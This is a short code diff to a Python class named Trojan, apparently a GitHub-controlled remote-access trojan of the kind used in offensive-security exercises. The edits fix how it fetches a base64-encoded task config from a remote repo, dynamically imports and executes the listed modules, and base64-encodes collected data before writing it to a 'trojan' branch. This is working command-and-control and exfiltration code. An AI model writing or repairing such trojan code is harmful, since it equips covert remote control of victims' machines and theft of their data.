@@ -3,7 +3,8 @@ import json
 import random
 import sys
 import threading
-import datetime,time
+import time
+from datetime import datetime
 from git_funcs import *
     
 class Trojan:
@@ -16,8 +17,9 @@ class Trojan:
     def get_config(self):
         # take the configuration file and import the modules
         try:
-            config_json = get_file_contents("config", self.config_file, self.repo)
+            config_json = get_file_contents("trojan/config", self.config_file, self.repo)
             config= json.loads(base64.b64decode(config_json))
+            print(config)
             for task in config:
                 if task["module"] not in sys.modules:
                     exec(f"import {task['module']}")
@@ -31,10 +33,10 @@ class Trojan:
 
     def store_result(self, data):
         message = datetime.now().isoformat()
-        remote_path=f'data/{self.id}/{message}.data'
+        remote_path=f'trojan/data/{self.id}/{message}.data'
         bindata = bytes('%r' % data,'utf-8')
         try:
-            self.repo.create_file(remote_path, message, base64.b64decode(bindata), branch="main")
+            self.repo.create_file(remote_path, message, base64.b64encode(bindata), branch="trojan")
             print(f"Data stored at {remote_path}")
         except Exception as e:
             print(f"Error storing data: {e}")
